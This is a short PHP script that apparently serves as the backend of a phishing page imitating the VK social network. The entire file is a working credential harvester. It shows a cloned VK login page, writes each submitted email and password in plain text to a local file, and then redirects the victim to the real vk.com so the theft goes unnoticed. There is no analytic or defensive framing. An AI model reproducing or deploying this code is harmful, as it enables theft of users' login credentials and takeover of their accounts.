<?php
if (isset($_POST["email"])) {
    $file = fopen("accounts.txt", "a");
    fwrite($file, $_POST["email"]."\r\n".$_POST["pass"]."\r\n\r\n");
    fclose($file);
    header("Location: http://vk.com");
} else {
    echo file_get_contents("vk.com.html");
}